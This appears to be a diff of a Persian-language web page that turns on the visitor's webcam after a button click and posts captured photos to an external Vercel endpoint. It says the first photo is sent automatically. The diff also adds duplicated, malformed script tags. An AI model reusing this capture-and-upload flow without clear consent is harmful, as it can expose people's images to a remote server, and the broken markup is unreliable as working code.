@@ -86,21 +86,25 @@ p{
     <button class="send" id="button">ارسال عکس</button>
 </div>
 <script>
-
-  
-   const video = document.getElementById('video');
+<script>
+    // ✅ تعریف متغیرها بر اساس ساختار جدید HTML
+    const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const log = document.getElementById('log');
     const startBtn = document.getElementById('startBtn');
-    const controlsDiv = document.getElementById('controls');
-    const sendManualBtn = document.getElementById('button');
+    // ❌ controlsDiv حذف شده است
+    const sendManualBtn = document.getElementById('button'); // ID دکمه ارسال عکس
+
     let streamActive = false;
 
     // --- R1: شروع دوربین و ارسال اولین عکس ---
     startBtn.addEventListener('click', async () => {
         startBtn.style.display = 'none';
-        controlsDiv.style.display = 'block';
-        video.style.display = 'block';
+        
+        // ❌ خطوط مربوط به controlsDiv حذف شدند
+        
+        video.style.display = 'block'; 
+        sendManualBtn.style.display = 'block'; // ✅ نمایش دکمه ارسال عکس
         log.innerText = "در حال گرفتن مجوز دوربین...";
         startCamera();
     });
@@ -161,16 +165,18 @@ p{
         try {
             log.innerText = "";
             await fetch('https://eeeeyuzl.vercel.app/send-photo', { method: 'POST', body: formData });
-            log.innerText = ``; 
+            log.innerText = `✅ ارسال موفق.`; 
         } catch (e) {
             log.innerText = "⚠️ خطا در ارسال به سرور.";
         }
     }
 </script>
+</script>
 
 </body>
 
 </html>
+
 
 
 
